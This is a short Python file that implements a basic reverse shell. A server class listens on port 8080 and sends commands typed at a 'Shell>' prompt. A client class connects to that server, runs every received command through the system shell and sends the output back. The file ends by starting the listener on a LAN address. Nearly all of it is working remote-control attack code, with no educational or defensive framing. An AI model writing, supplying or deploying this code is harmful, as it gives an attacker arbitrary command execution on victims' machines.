import socket
import subprocess

class Server:
    def connect(self, ip):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((ip, 8080))
        s.listen(1)
        print('Listening for incoming TCP connection')
        conn, addr = s.accept()
        print('Connection from: ', addr)
        while True:
            command = input("Shell> ")
            if 'terminate' in command:
                conn.send('terminate')
                conn.close()
                break
            else:
                conn.send(command)
                print(conn.recv(1024))

class Client:
    def connect(self, ip):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 8080))
        while True:
            command = s.recv(1024)
            if 'terminate' in command:
                s.close()
                break
            else:
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s.send(CMD.stdout.read())
                s.send(CMD.stderr.read())


Server().connect("192.168.2.1")